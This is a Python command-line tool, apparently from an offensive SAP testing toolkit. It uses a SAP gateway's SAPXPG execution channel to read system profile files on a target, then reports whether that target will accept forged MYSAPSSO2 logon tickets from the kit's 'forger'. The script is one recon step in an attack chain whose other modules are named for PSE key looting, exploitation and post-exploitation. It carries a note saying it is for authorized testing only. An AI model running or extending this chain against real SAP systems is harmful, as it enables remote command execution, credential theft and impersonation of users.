#!/usr/bin/env python3
"""Standalone CLI: SSO2 profile pre-flight check against a SAP target.

Reads SAP profile files (``DEFAULT.PFL`` + instance profiles under
``/usr/sap/<SID>/SYS/profile/``) via the existing GW SAPXPG channel
and reports whether the system is configured to accept/create
MYSAPSSO2 tickets in the shape our forger emits.

Usage::

    python3 tools/check_sso2_profile.py \\
        --host 192.168.2.209 --port 3300 \\
        --sid S4H --hostname s4hanadev --instance 00 \\
        --client 000

Output (example, against a misconfigured target)::

    [+] SSO2 profile check: OK
        [?] login/create_sso2_ticket=2 — legitimate tickets on this
            AS do NOT embed the signing cert.  Forge with
            include_cert=False to match (currently the forger
            defaults to True).
        [i] recommended include_cert=False (based on observed
            login/create_sso2_ticket)
        [r] read: /usr/sap/S4H/SYS/profile/DEFAULT.PFL
        [r] read: /usr/sap/S4H/SYS/profile/S4H_D00_s4hanadev

The check exits ``0`` when ``ok=True``, ``2`` when there are hard
blockers, and ``1`` on infrastructure failure (couldn't reach the
gateway, couldn't read any profile file at all, etc.) — so it's safe
to chain into shell pipelines.

This tool reuses the GW session machinery from
``test_mysapsso2_chain.py``; see that file for the underlying NI/P1/P2
state machine.

For authorized security testing only (Cyber Verification Program).
"""
from __future__ import annotations

import argparse
import os
import sys

# ---------------------------------------------------------------------
# Path setup — locate SAPMAP modules + sibling tools
# ---------------------------------------------------------------------
_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_TOOLS_DIR)

for _subdir in ("modules/exploitation", "modules/postex",
                "modules/core", "modules"):
    _p = os.path.join(_ROOT, _subdir)
    if _p not in sys.path:
        sys.path.insert(0, _p)
# Also make sibling tool helpers importable
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)

# Reuse the live-GW session + robust exec_fn from the chain tester.
# That module already deals with: chunked python3 reads, sapxpg
# kernel buffer quirks, retry-on-conv-drop, the lot.
from test_mysapsso2_chain import _GwSession, make_robust_exec_fn  # type: ignore
from sap_pse_loot import make_chunked_read_adapter
from sap_profile_check import (check_sso2_parameters,
                                  format_check_summary)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="SAP SSO2 profile pre-flight check via GW SAPXPG",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Usage::", 1)[1] if __doc__ else "")
    ap.add_argument("--host", required=True,
                    help="SAP gateway host / IP")
    ap.add_argument("--port", type=int, required=True,
                    help="SAP gateway port (e.g. 3300 + sysnr)")
    ap.add_argument("--sid", required=True,
                    help="System ID (e.g. S4H)")
    ap.add_argument("--hostname", required=True,
                    help="Target application server hostname "
                         "(as registered in the gateway)")
    ap.add_argument("--instance", default="00",
                    help="Instance number (e.g. 00, 01)")
    ap.add_argument("--kernel", default="793",
                    help="SAP kernel release (default: 793)")
    ap.add_argument("--client", default="000",
                    help="SAP client / MANDT (default: 000)")
    ap.add_argument("--timeout", type=int, default=20,
                    help="Per-call timeout in seconds")
    ap.add_argument("--no-instance-profiles", action="store_true",
                    help="Only read DEFAULT.PFL; skip per-instance "
                         "profile files (faster, less complete)")
    ap.add_argument("-v", "--verbose", action="store_true",
                    help="Print observed params + profile paths")
    args = ap.parse_args()

    print(f"[*] Checking SSO2 profile params on "
          f"{args.host}:{args.port} (SID={args.sid})")

    # Open the GW session (P1+P2) using the same logic the chain
    # tester uses for PSE extraction.
    session = _GwSession(
        host=args.host, port=args.port,
        sid=args.sid, hostname=args.hostname,
        instance=args.instance.zfill(2), kernel=args.kernel,
        client=args.client, timeout=args.timeout,
        verbose=args.verbose)

    raw_exec = make_robust_exec_fn(session, verbose=args.verbose)

    # Wrap with the chunked-read adapter — profile files are tiny
    # (a few KB at most) but the adapter is the canonical way to
    # talk to sapxpg + base64 in SAPMAP.
    chunked_exec = make_chunked_read_adapter(
        raw_exec, chunk_raw_bytes=72, verbose=args.verbose)

    # Run the check
    try:
        result = check_sso2_parameters(
            chunked_exec, args.sid,
            include_instance_profiles=not args.no_instance_profiles)
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        return 1
    except Exception as e:
        print(f"[-] check failed: {type(e).__name__}: {e}")
        return 1

    print()
    print(format_check_summary(result, verbose=args.verbose))
    print()

    if not result.get("profiles_read"):
        # Couldn't read anything — infrastructure failure
        return 1
    if not result.get("ok"):
        # Hard blockers found (e.g. accept_sso2_ticket=0)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
